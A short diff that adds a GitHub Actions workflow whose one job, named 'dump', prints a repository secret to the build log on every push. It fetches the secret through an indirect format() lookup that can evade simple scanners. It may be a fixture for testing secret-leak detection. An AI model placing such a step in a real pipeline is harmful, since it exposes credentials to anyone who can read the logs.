@@ -1,0 +1,6 @@
+on: push
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo '${{ secrets[format('{0}', 'KEY')] }}'
